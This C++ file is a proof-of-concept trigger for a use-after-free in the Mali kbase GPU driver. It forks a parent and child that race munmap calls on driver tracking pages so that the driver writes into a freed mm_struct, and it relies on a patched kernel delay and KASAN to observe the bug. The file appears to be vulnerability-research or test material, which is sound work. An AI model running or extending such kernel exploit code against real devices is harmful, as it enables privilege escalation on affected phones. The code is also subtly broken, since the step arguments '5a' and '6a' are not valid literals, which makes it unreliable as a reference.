// SPDX-License-Identifier: MIT
/*
 * C++ demonstration of Mali driver vulnerability testing approach
 * This shows the testing methodology with proper type safety
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <signal.h>

// IOCTL constants
#define KBASE_IOCTL_TYPE 0x80

typedef uint8_t __u8;
typedef uint16_t __u16;
typedef uint32_t __u32;
typedef uint64_t __u64;

struct kbase_ioctl_version_check {
    __u16 major;
    __u16 minor;
};
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct kbase_ioctl_set_flags {
    __u32 create_flags;
};
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

#define LOCAL_PAGE_SHIFT 12
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)

// Simple error checking class
class SysChecker {
public:
    template<typename T>
    static T check(T result, const char* call, const char* file, int line) {
        if (result == (T)-1) {
            fprintf(stderr, "[FATAL] System call failed: %s\n", strerror(errno));
            fprintf(stderr, "       File: %s, Line: %d\n", file, line);
            fprintf(stderr, "       Call: %s\n", call);
            exit(1);
        }
        return result;
    }
};

#define SYSCHK(x) SysChecker::check(x, #x, __FILE__, __LINE__)

void print_step(int step, const char* description) {
    printf("[STEP %d] %s\n", step, description);
}

int main(void) {
    printf("=== Mali Kbase mm_struct UAF Test Demo ===\n");
    printf("PID: %d, PPID: %d\n", getpid(), getppid());
    printf("\n");
    
    // Step 1: Device initialization
    print_step(1, "Device Initialization - Opening /dev/mali0");
    printf("  - Opening /dev/mali0 device file\n");
    
    int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));
    printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);
    
    struct stat fd_stat;
    if (fstat(mali_fd, &fd_stat) == 0) {
        printf("  -> Device type: %s\n", (S_ISCHR(fd_stat.st_mode) ? "character device" : "other"));
        printf("  -> Device number: %d:%d\n", major(fd_stat.st_rdev), minor(fd_stat.st_rdev));
    }
    
    // Step 2: Version check ioctl
    print_step(2, "Version Check Ioctl - KBASE_IOCTL_VERSION_CHECK");
    printf("  - Command: _IOWR(0x80, 0, struct kbase_ioctl_version_check)\n");
    printf("  - Purpose: Verify Mali Kbase driver version compatibility\n");
    
    struct kbase_ioctl_version_check vc = {11, 11};
    printf("  - Input: major=%d, minor=%d\n", vc.major, vc.minor);
    
    int version_ret = ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    if (version_ret < 0) {
        printf("  -> FAILURE: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d\n", version_ret);
        printf("  -> Result: major=%d, minor=%d\n", vc.major, vc.minor);
    }
    
    // Step 3: Set flags ioctl
    print_step(3, "Set Flags Ioctl - KBASE_IOCTL_SET_FLAGS");
    printf("  - Command: _IOW(0x80, 1, struct kbase_ioctl_set_flags)\n");
    printf("  - Purpose: Configure initial driver flags\n");
    
    struct kbase_ioctl_set_flags set_flags = {0};
    printf("  - Input: create_flags=%d\n", set_flags.create_flags);
    
    int flags_ret = ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
    if (flags_ret < 0) {
        printf("  -> FAILURE: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d\n", flags_ret);
    }
    
    // Step 4: Create tracking page
    print_step(4, "Tracking Page Mapping - Create 2-page VMA");
    printf("  - Command: mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED, mali_fd, BASE_MEM_MAP_TRACKING_HANDLE)\n");
    printf("  - Purpose: Create 8KB tracking VMA (2 pages)\n");
    
    void* parent_tracking_page = SYSCHK(mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED,
                                             mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
    printf("  -> SUCCESS: Page mapped at address: %p\n", parent_tracking_page);
    
    void* page1 = parent_tracking_page;
    void* page2 = (char*)parent_tracking_page + 0x1000;
    printf("  -> Page 1 address: %p\n", page1);
    printf("  -> Page 2 address: %p\n", page2);
    
    // Step 5: Fork for race condition
    print_step(5, "Process Fork - Create child for race condition");
    printf("  - Purpose: Create competing child process\n");
    printf("  - Rationale: Parent and child compete for kctx->process_mm slot\n");
    
    if (signal(SIGCHLD, SIG_IGN) == SIG_ERR) {
        printf("  -> WARNING: SIGCHLD handler setup failed\n");
    }
    
    pid_t child_pid = SYSCHK(fork());
    printf("  -> SUCCESS: Child process PID: %d\n", child_pid);
    
    if (child_pid == 0) {
        // Child process
        print_step(5a, "Child Process - Execute child side of race");
        printf("  - Setting child name to 'CHILD'\n");
        prctl(PR_SET_NAME, "CHILD", 0, 0, 0);
        
        printf("  - Creating child tracking page (1 page)\n");
        void* child_tracking_page = SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED,
                                               mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
        printf("  -> Child page address: %p\n", child_tracking_page);
        
        printf("  - Sleeping 2 seconds for race timing control\n");
        sleep(2);
        
        printf("  - Unmapping child page (triggers UAF setup)\n");
        SYSCHK(munmap(child_tracking_page, 0x1000));
        printf("  -> Child page unmapped, child's mm_struct will be freed\n");
        
        printf("  - Exiting child (this frees the mm_struct)\n");
        exit(0);
    } else {
        // Parent process
        print_step(6a, "Parent Process - Set up race window");
        printf("  - Sleeping 1 second for race window setup\n");
        
        sleep(1);
        
        printf("  - Setting name to 'SLOWME' (enables kernel patch delay)\n");
        prctl(PR_SET_NAME, "SLOWME", 0, 0, 0);
        
        print_step(6b, "Parent Unmap - Trigger drain race");
        printf("  - Command: munmap(parent_page, 0x1000)\n");
        printf("  - Purpose: Trigger kbase_special_vm_close() -> drain path\n");
        printf("  - Critical: This is where UAF occurs!\n");
        
        SYSCHK(munmap(page1, 0x1000));
        printf("  -> Parent page unmapped, drain UAF will attempt write\n");
        
        printf("  - Setting name back to 'PARENT'\n");
        prctl(PR_SET_NAME, "PARENT", 0, 0, 0);
        
        print_step(7, "Race Condition Analysis");
        printf("  - Child mm_struct has been freed by kernel (do_exit -> mmput -> __mmdrop)\n");
        printf("  - Parent's drain will write to child's freed mm_struct\n");
        printf("  - Target: kbasep_add_mm_counter(mm, MM_FILEPAGES, -pages)\n");
        printf("  - Field: mm->rss_stat.count[MM_FILEPAGES] at offset 0x%x\n", 696);
        printf("  - Look for KASAN: 'BUG: KASAN: use-after-free in kbasep_add_mm_counter'\n");
        
        // Wait for child
        waitpid(child_pid, NULL, 0);
        printf("  -> Child process completed\n");
        
        return 0;
    }
}